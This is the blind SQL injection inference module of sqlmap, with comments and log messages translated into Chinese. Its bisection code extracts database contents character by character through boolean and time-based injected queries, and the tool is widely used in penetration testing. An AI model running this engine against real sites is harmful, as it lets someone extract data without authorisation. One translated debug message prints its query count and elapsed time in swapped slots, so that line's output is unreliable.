#!/usr/bin/env python
#coding=utf-8
"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re
import threading
import time

from extra.safe2bin.safe2bin import safecharencode
from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToStdout
from lib.core.common import decodeHexValue
from lib.core.common import decodeIntToUnicode
from lib.core.common import filterControlChars
from lib.core.common import getCharset
from lib.core.common import getCounter
from lib.core.common import goGoodSamaritan
from lib.core.common import getPartRun
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import incrementCounter
from lib.core.common import safeStringFormat
from lib.core.common import singleTimeWarnMessage
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import ADJUST_TIME_DELAY
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapThreadException
from lib.core.settings import CHAR_INFERENCE_MARK
from lib.core.settings import INFERENCE_BLANK_BREAK
from lib.core.settings import INFERENCE_UNKNOWN_CHAR
from lib.core.settings import INFERENCE_GREATER_CHAR
from lib.core.settings import INFERENCE_EQUALS_CHAR
from lib.core.settings import INFERENCE_NOT_EQUALS_CHAR
from lib.core.settings import MAX_BISECTION_LENGTH
from lib.core.settings import MAX_REVALIDATION_STEPS
from lib.core.settings import NULL
from lib.core.settings import PARTIAL_HEX_VALUE_MARKER
from lib.core.settings import PARTIAL_VALUE_MARKER
from lib.core.settings import PAYLOAD_DELIMITER
from lib.core.settings import RANDOM_INTEGER_MARKER
from lib.core.settings import VALID_TIME_CHARS_RUN_THRESHOLD
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.progress import ProgressBar
from lib.utils.xrange import xrange

def bisection(payload, expression, length=None, charsetType=None, firstChar=None, lastChar=None, dump=False):
    """
    可用于在受影响的主机上执行盲目SQL注入的二分法
    """

    abortedFlag = False
    showEta = False
    partialValue = u""
    finalValue = None
    retrievedLength = 0
    asciiTbl = getCharset(charsetType)
    threadData = getCurrentThreadData()
    timeBasedCompare = (kb.technique in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))
    retVal = hashDBRetrieve(expression, checkConf=True)

    if retVal:
        if PARTIAL_HEX_VALUE_MARKER in retVal:
            retVal = retVal.replace(PARTIAL_HEX_VALUE_MARKER, "")

            if retVal and conf.hexConvert:
                partialValue = retVal
                infoMsg = "resuming partial value: %s" % safecharencode(partialValue)
                logger.info(infoMsg)
        elif PARTIAL_VALUE_MARKER in retVal:
            retVal = retVal.replace(PARTIAL_VALUE_MARKER, "")

            if retVal and not conf.hexConvert:
                partialValue = retVal
                infoMsg = "resuming partial value: %s" % safecharencode(partialValue)
                logger.info(infoMsg)
        else:
            infoMsg = "resumed: %s" % safecharencode(retVal)
            logger.info(infoMsg)

            return 0, retVal

    try:
        # 如果使用"common prediction"功能（a.k.a.“good samaritan”）或从API调用引擎，请设置kb.partRunSet
        if conf.predictOutput:
            kb.partRun = getPartRun()
        elif conf.api:
            kb.partRun = getPartRun(alias=False)
        else:
            kb.partRun = None

        if partialValue:
            firstChar = len(partialValue)
        elif "LENGTH(" in expression.upper() or "LEN(" in expression.upper():
            firstChar = 0
        elif (kb.fileReadMode or dump) and conf.firstChar is not None and (isinstance(conf.firstChar, int) or (isinstance(conf.firstChar, basestring) and conf.firstChar.isdigit())):
            firstChar = int(conf.firstChar) - 1
            if kb.fileReadMode:
                firstChar *= 2
        elif isinstance(firstChar, basestring) and firstChar.isdigit() or isinstance(firstChar, int):
            firstChar = int(firstChar) - 1
        else:
            firstChar = 0

        if "LENGTH(" in expression.upper() or "LEN(" in expression.upper():
            lastChar = 0
        elif dump and conf.lastChar is not None and (isinstance(conf.lastChar, int) or (isinstance(conf.lastChar, basestring) and conf.lastChar.isdigit())):
            lastChar = int(conf.lastChar)
        elif isinstance(lastChar, basestring) and lastChar.isdigit() or isinstance(lastChar, int):
            lastChar = int(lastChar)
        else:
            lastChar = 0

        if Backend.getDbms():
            _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)
            nulledCastedField = agent.nullAndCastField(fieldToCastStr)
            expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)
            expressionUnescaped = unescaper.escape(expressionReplaced)
        else:
            expressionUnescaped = unescaper.escape(expression)

        if isinstance(length, basestring) and length.isdigit() or isinstance(length, int):
            length = int(length)
        else:
            length = None

        if length == 0:
            return 0, ""

        if length and (lastChar > 0 or firstChar > 0):
            length = min(length, lastChar or length) - firstChar
        # 二分算法中输入(入口)的最大 (多线程) 长度
        # MAX_BISECTION_LENGTH = 50 * 1024 * 1024
        if length and length > MAX_BISECTION_LENGTH:
            length = None

        showEta = conf.eta and isinstance(length, int)
        numThreads = min(conf.threads, length) or 1

        if showEta:
            progress = ProgressBar(maxValue=length)

        if timeBasedCompare and conf.threads > 1 and not conf.forceThreads:
            warnMsg = u"多线程在基于时间的数据检索中被认为是不安全的,自动关闭它"
            singleTimeWarnMessage(warnMsg)

        if numThreads > 1:
            if not timeBasedCompare or conf.forceThreads:
                debugMsg = u"启动%d个线程 %s" % (numThreads, ("s" if numThreads > 1 else ""))
                logger.debug(debugMsg)
            else:
                numThreads = 1

        if conf.threads == 1 and not timeBasedCompare and not conf.predictOutput:
            warnMsg = u"运行在单线程模式，请考虑使用选项“-threads”来更快的检索数据。"
            singleTimeWarnMessage(warnMsg)

        if conf.verbose in (1, 2) and not showEta and not conf.api:
            if isinstance(length, int) and conf.threads > 1:
                dataToStdout("[%s] [INFO] retrieved: %s" % (time.strftime("%X"), "_" * min(length, conf.progressWidth)))
                dataToStdout("\r[%s] [INFO] retrieved: " % time.strftime("%X"))
            else:
                dataToStdout("\r[%s] [INFO] retrieved: " % time.strftime("%X"))

        hintlock = threading.Lock()

        def tryHint(idx):
            with hintlock:
                hintValue = kb.hintValue

            if hintValue is not None and len(hintValue) >= idx:
                if Backend.getIdentifiedDbms() in (DBMS.SQLITE, DBMS.ACCESS, DBMS.MAXDB, DBMS.DB2):
                    posValue = hintValue[idx - 1]
                else:
                    posValue = ord(hintValue[idx - 1])

                forgedPayload = agent.extractPayload(payload)
                forgedPayload = safeStringFormat(forgedPayload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, posValue))
                result = Request.queryPage(agent.replacePayload(payload, forgedPayload), timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(kb.technique)

                if result:
                    return hintValue[idx - 1]

            with hintlock:
                kb.hintValue = None

            return None

        def validateChar(idx, value):
            """
            用于推理——在基于时间的SQL注入中，如果原始值和检索的值不相等，会延迟响应时间。
            """

            validationPayload = re.sub(r"(%s.*?)%s(.*?%s)" % (PAYLOAD_DELIMITER, INFERENCE_GREATER_CHAR, PAYLOAD_DELIMITER), r"\g<1>%s\g<2>" % INFERENCE_NOT_EQUALS_CHAR, payload)

            if "'%s'" % CHAR_INFERENCE_MARK not in payload:
                forgedPayload = safeStringFormat(validationPayload, (expressionUnescaped, idx, value))
            else:
                # e.g.: ... > '%c' -> ... > ORD(..)
                markingValue = "'%s'" % CHAR_INFERENCE_MARK
                unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(value))
                forgedPayload = safeStringFormat(validationPayload, (expressionUnescaped, idx)).replace(markingValue, unescapedCharValue)

            result = not Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)

            if result and timeBasedCompare:
                result = threadData.lastCode == kb.injection.data[kb.technique].trueCode
                if not result:
                    warnMsg = "在验证阶段检测到的HTTP代码'%s'与预期的'%s'不同" % (threadData.lastCode, kb.injection.data[kb.technique].trueCode)
                    singleTimeWarnMessage(warnMsg)

            incrementCounter(kb.technique)

            return result

        def getChar(idx, charTbl=None, continuousOrder=True, expand=charsetType is None, shiftTable=None, retried=None):
            """
            continuousOrder意味着每两个相邻的数值之间的距离正好是1
            """

            result = tryHint(idx)

            if result:
                return result

            if charTbl is None:
                charTbl = type(asciiTbl)(asciiTbl)

            originalTbl = type(charTbl)(charTbl)

            if continuousOrder and shiftTable is None:
                # 用于逐渐扩展到unicode字符空间
                shiftTable = [2, 2, 3, 3, 5, 4]

            if "'%s'" % CHAR_INFERENCE_MARK in payload:
                for char in ('\n', '\r'):
                    if ord(char) in charTbl:
                        charTbl.remove(ord(char))

            if not charTbl:
                return None

            elif len(charTbl) == 1:
                forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, charTbl[0]))
                result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(kb.technique)

                if result:
                    return decodeIntToUnicode(charTbl[0])
                else:
                    return None

            maxChar = maxValue = charTbl[-1]
            minChar = minValue = charTbl[0]
            firstCheck = False
            lastCheck = False
            unexpectedCode = False

            while len(charTbl) != 1:
                position = None

                if charsetType is None:
                    if not firstCheck:
                        try:
                            try:
                                lastChar = [_ for _ in threadData.shared.value if _ is not None][-1]
                            except IndexError:
                                lastChar = None
                            if 'a' <= lastChar <= 'z':
                                position = charTbl.index(ord('a') - 1)  # 96
                            elif 'A' <= lastChar <= 'Z':
                                position = charTbl.index(ord('A') - 1)  # 64
                            elif '0' <= lastChar <= '9':
                                position = charTbl.index(ord('0') - 1)  # 47
                        except ValueError:
                            pass
                        finally:
                            firstCheck = True

                    elif not lastCheck and numThreads == 1:  # 在多线程环境中不可用
                        if charTbl[(len(charTbl) >> 1)] < ord(' '):
                            try:
                                # 如果当前值倾斜到0，则最好使用最后一个字符检查
                                position = charTbl.index(1)
                            except ValueError:
                                pass
                            finally:
                                lastCheck = True

                if position is None:
                    position = (len(charTbl) >> 1)

                posValue = charTbl[position]
                falsePayload = None

                if "'%s'" % CHAR_INFERENCE_MARK not in payload:
                    forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx, posValue))
                    falsePayload = safeStringFormat(payload, (expressionUnescaped, idx, RANDOM_INTEGER_MARKER))
                else:
                    # e.g.: ... > '%c' -> ... > ORD(..)
                    markingValue = "'%s'" % CHAR_INFERENCE_MARK
                    unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(posValue))
                    forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx)).replace(markingValue, unescapedCharValue)
                    falsePayload = safeStringFormat(payload, (expressionUnescaped, idx)).replace(markingValue, NULL)

                if timeBasedCompare:
                    if kb.responseTimeMode:
                        kb.responseTimePayload = falsePayload
                    else:
                        kb.responseTimePayload = None

                result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(kb.technique)

                if not timeBasedCompare:
                    unexpectedCode |= threadData.lastCode not in (kb.injection.data[kb.technique].falseCode, kb.injection.data[kb.technique].trueCode)
                    if unexpectedCode:
                        warnMsg = u"检测到意外的HTTP代码 '%s'，在类似情况下使用(额外)验证步骤。" % threadData.lastCode
                        singleTimeWarnMessage(warnMsg)

                if result:
                    minValue = posValue

                    if type(charTbl) != xrange:
                        charTbl = charTbl[position:]
                    else:
                        # xrange() - 用于内存/空间优化的扩展虚拟字符集
                        charTbl = xrange(charTbl[position], charTbl[-1] + 1)
                else:
                    maxValue = posValue

                    if type(charTbl) != xrange:
                        charTbl = charTbl[:position]
                    else:
                        charTbl = xrange(charTbl[0], charTbl[position])

                if len(charTbl) == 1:
                    if continuousOrder:
                        if maxValue == 1:
                            return None

                        # 超越原来的字符集
                        elif minValue == maxChar:
                            # 如果原来的charTbl是[0,..,127]
                            # 新的一个将是[128,..,(128 << 4) - 1]或128到2047
                            # 而不是使用所有元素制作一个巨大的列表，
                            # 我们使用一个xrange，它是一个虚拟列表
                            if expand and shiftTable:
                                charTbl = xrange(maxChar + 1, (maxChar + 1) << shiftTable.pop())
                                originalTbl = xrange(charTbl)
                                maxChar = maxValue = charTbl[-1]
                                minChar = minValue = charTbl[0]
                            else:
                                return None
                        else:
                            retVal = minValue + 1

                            if retVal in originalTbl or (retVal == ord('\n') and CHAR_INFERENCE_MARK in payload):
                                if (timeBasedCompare or unexpectedCode) and not validateChar(idx, retVal):
                                    if not kb.originalTimeDelay:
                                        kb.originalTimeDelay = conf.timeSec

                                    threadData.validationRun = 0
                                    # 推断重新验证字符的最大次数（根据需要）
                                    # MAX_REVALIDATION_STEPS = 5
                                    if retried < MAX_REVALIDATION_STEPS:
                                        errMsg = u"检测到无效字符，重试.."
                                        logger.error(errMsg)

                                        if timeBasedCompare:
                                            if kb.adjustTimeDelay is not ADJUST_TIME_DELAY.DISABLE:
                                                conf.timeSec += 1
                                                warnMsg = u"时间延迟增加到%d秒%s " % (conf.timeSec, 's' if conf.timeSec > 1 else '')
                                                logger.warn(warnMsg)

                                            if kb.adjustTimeDelay is ADJUST_TIME_DELAY.YES:
                                                dbgMsg = u"关闭时间自动调整机制"
                                                logger.debug(dbgMsg)
                                                kb.adjustTimeDelay = ADJUST_TIME_DELAY.NO

                                        return getChar(idx, originalTbl, continuousOrder, expand, shiftTable, (retried or 0) + 1)
                                    else:
                                        errMsg = u"无法正确验证最后一个字符值('%s').." % decodeIntToUnicode(retVal)
                                        logger.error(errMsg)
                                        conf.timeSec = kb.originalTimeDelay
                                        return decodeIntToUnicode(retVal)
                                else:
                                    if timeBasedCompare:
                                        threadData.validationRun += 1
                                        if kb.adjustTimeDelay is ADJUST_TIME_DELAY.NO and threadData.validationRun > VALID_TIME_CHARS_RUN_THRESHOLD:
                                            dbgMsg = u"时间自动调整机制"
                                            logger.debug(dbgMsg)
                                            kb.adjustTimeDelay = ADJUST_TIME_DELAY.YES

                                    return decodeIntToUnicode(retVal)
                            else:
                                return None
                    else:
                        if minValue == maxChar or maxValue == minChar:
                            return None

                        for index in xrange(len(originalTbl)):
                            if originalTbl[index] == minValue:
                                break

                        # 如果我们正在使用非连续元素，那么minValue和character之后都是可能的候选者
                        for retVal in (originalTbl[index], originalTbl[index + 1]):
                            forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, retVal))
                            result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                            incrementCounter(kb.technique)

                            if result:
                                return decodeIntToUnicode(retVal)

                        return None

        # Go 多线程 (--threads > 1)
        if conf.threads > 1 and isinstance(length, int) and length > 1:
            threadData.shared.value = [None] * length
            threadData.shared.index = [firstChar]    # 作为python嵌套函数范围的列表
            threadData.shared.start = firstChar

            try:
                def blindThread():
                    threadData = getCurrentThreadData()

                    while kb.threadContinue:
                        kb.locks.index.acquire()

                        if threadData.shared.index[0] - firstChar >= length:
                            kb.locks.index.release()

                            return

                        threadData.shared.index[0] += 1
                        curidx = threadData.shared.index[0]
                        kb.locks.index.release()

                        if kb.threadContinue:
                            charStart = time.time()
                            val = getChar(curidx)
                            if val is None:
                                val = INFERENCE_UNKNOWN_CHAR
                        else:
                            break

                        with kb.locks.value:
                            threadData.shared.value[curidx - 1 - firstChar] = val
                            currentValue = list(threadData.shared.value)

                        if kb.threadContinue:
                            if showEta:
                                progress.progress(time.time() - charStart, threadData.shared.index[0])
                            elif conf.verbose >= 1:
                                startCharIndex = 0
                                endCharIndex = 0

                                for i in xrange(length):
                                    if currentValue[i] is not None:
                                        endCharIndex = max(endCharIndex, i)

                                output = ''

                                if endCharIndex > conf.progressWidth:
                                    startCharIndex = endCharIndex - conf.progressWidth

                                count = threadData.shared.start

                                for i in xrange(startCharIndex, endCharIndex + 1):
                                    output += '_' if currentValue[i] is None else currentValue[i]

                                for i in xrange(length):
                                    count += 1 if currentValue[i] is not None else 0

                                if startCharIndex > 0:
                                    output = '..' + output[2:]

                                if (endCharIndex - startCharIndex == conf.progressWidth) and (endCharIndex < length - 1):
                                    output = output[:-2] + '..'

                                if conf.verbose in (1, 2) and not showEta and not conf.api:
                                    _ = count - firstChar
                                    output += '_' * (min(length, conf.progressWidth) - len(output))
                                    status = ' %d/%d (%d%%)' % (_, length, round(100.0 * _ / length))
                                    output += status if _ != length else " " * len(status)

                                    dataToStdout("\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), filterControlChars(output)))

                runThreads(numThreads, blindThread, startThreadMsg=False)

            except KeyboardInterrupt:
                abortedFlag = True

            finally:
                value = [_ for _ in partialValue]
                value.extend(_ for _ in threadData.shared.value)

            infoMsg = None

            # 如果我们没有正确抓取一个字符，可能意味着与目标URL的连接丢失
            if None in value:
                partialValue = "".join(value[:value.index(None)])

                if partialValue:
                    infoMsg = u"\r[%s] [INFO] 部分检索: %s" % (time.strftime("%X"), filterControlChars(partialValue))
            else:
                finalValue = "".join(value)
                infoMsg = u"\r[%s] [INFO] 检索: %s" % (time.strftime("%X"), filterControlChars(finalValue))

            if conf.verbose in (1, 2) and not showEta and infoMsg and not conf.api:
                dataToStdout(infoMsg)

        # No 多线程 (--threads = 1)
        else:
            index = firstChar
            threadData.shared.value = ""

            while True:
                index += 1
                charStart = time.time()

                # 常见的预测功能 (a.k.a. "good samaritan")
                # NOTE: 注意：仅当暂时未设置多线程时使用
                if conf.predictOutput and len(partialValue) > 0 and kb.partRun is not None:
                    val = None
                    commonValue, commonPattern, commonCharset, otherCharset = goGoodSamaritan(partialValue, asciiTbl)

                    # If there is one single output in common-outputs, check
                    # it via equal against the query output
                    if commonValue is not None:
                        # One-shot query containing equals commonValue
                        testValue = unescaper.escape("'%s'" % commonValue) if "'" not in commonValue else unescaper.escape("%s" % commonValue, quote=False)

                        query = kb.injection.data[kb.technique].vector
                        query = agent.prefixQuery(query.replace("[INFERENCE]", "(%s)=%s" % (expressionUnescaped, testValue)))
                        query = agent.suffixQuery(query)

                        result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
                        incrementCounter(kb.technique)

                        # Did we have luck?
                        if result:
                            if showEta:
                                progress.progress(time.time() - charStart, len(commonValue))
                            elif conf.verbose in (1, 2) or conf.api:
                                dataToStdout(filterControlChars(commonValue[index - 1:]))

                            finalValue = commonValue
                            break

                    # If there is a common pattern starting with partialValue,
                    # check it via equal against the substring-query output
                    if commonPattern is not None:
                        # Substring-query containing equals commonPattern
                        subquery = queries[Backend.getIdentifiedDbms()].substring.query % (expressionUnescaped, 1, len(commonPattern))
                        testValue = unescaper.escape("'%s'" % commonPattern) if "'" not in commonPattern else unescaper.escape("%s" % commonPattern, quote=False)

                        query = kb.injection.data[kb.technique].vector
                        query = agent.prefixQuery(query.replace("[INFERENCE]", "(%s)=%s" % (subquery, testValue)))
                        query = agent.suffixQuery(query)

                        result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
                        incrementCounter(kb.technique)

                        # Did we have luck?
                        if result:
                            val = commonPattern[index - 1:]
                            index += len(val) - 1

                    # Otherwise if there is no commonValue (single match from
                    # txt/common-outputs.txt) and no commonPattern
                    # (common pattern) use the returned common charset only
                    # to retrieve the query output
                    if not val and commonCharset:
                        val = getChar(index, commonCharset, False)

                    # If we had no luck with commonValue and common charset,
                    # use the returned other charset
                    if not val:
                        val = getChar(index, otherCharset, otherCharset == asciiTbl)
                else:
                    val = getChar(index, asciiTbl)

                if val is None:
                    finalValue = partialValue
                    break

                if kb.data.processChar:
                    val = kb.data.processChar(val)

                threadData.shared.value = partialValue = partialValue + val

                if showEta:
                    progress.progress(time.time() - charStart, index)
                elif conf.verbose in (1, 2) or conf.api:
                    dataToStdout(filterControlChars(val))

                # some DBMSes (e.g. Firebird, DB2, etc.) have issues with trailing spaces
                if len(partialValue) > INFERENCE_BLANK_BREAK and partialValue[-INFERENCE_BLANK_BREAK:].isspace() and partialValue.strip(' ')[-1:] != '\n':
                    finalValue = partialValue[:-INFERENCE_BLANK_BREAK]
                    break

                if (lastChar > 0 and index >= lastChar):
                    finalValue = "" if length == 0 else partialValue
                    finalValue = finalValue.rstrip() if len(finalValue) > 1 else finalValue
                    partialValue = None
                    break

    except KeyboardInterrupt:
        abortedFlag = True
    finally:
        kb.prependFlag = False
        kb.stickyLevel = None
        retrievedLength = len(finalValue or "")

        if finalValue is not None:
            finalValue = decodeHexValue(finalValue) if conf.hexConvert else finalValue
            hashDBWrite(expression, finalValue)
        elif partialValue:
            hashDBWrite(expression, "%s%s" % (PARTIAL_VALUE_MARKER if not conf.hexConvert else PARTIAL_HEX_VALUE_MARKER, partialValue))

    if conf.hexConvert and not abortedFlag and not conf.api:
        infoMsg = "\r[%s] [INFO] retrieved: %s  %s\n" % (time.strftime("%X"), filterControlChars(finalValue), " " * retrievedLength)
        dataToStdout(infoMsg)
    else:
        if conf.verbose in (1, 2) and not showEta and not conf.api:
            dataToStdout("\n")

        if (conf.verbose in (1, 2) and showEta) or conf.verbose >= 3:
            infoMsg = "retrieved: %s" % filterControlChars(finalValue)
            logger.info(infoMsg)

    if kb.threadException:
        raise SqlmapThreadException(u"线程内发生意外事件")

    if abortedFlag:
        raise KeyboardInterrupt

    _ = finalValue or partialValue

    return getCounter(kb.technique), safecharencode(_) if kb.safeCharEncode else _

def queryOutputLength(expression, payload):
    """
    返回查询输出长度
    """

    infoMsg = u"检索查询输出的长度"
    logger.info(infoMsg)

    start = time.time()

    lengthExprUnescaped = agent.forgeQueryOutputLength(expression)
    count, length = bisection(payload, lengthExprUnescaped, charsetType=CHARSET_TYPE.DIGITS)

    debugMsg = u"在%.2f秒内执行了%d个查询" % (count, calculateDeltaSeconds(start))
    logger.debug(debugMsg)

    if length == " ":
        length = 0

    return length
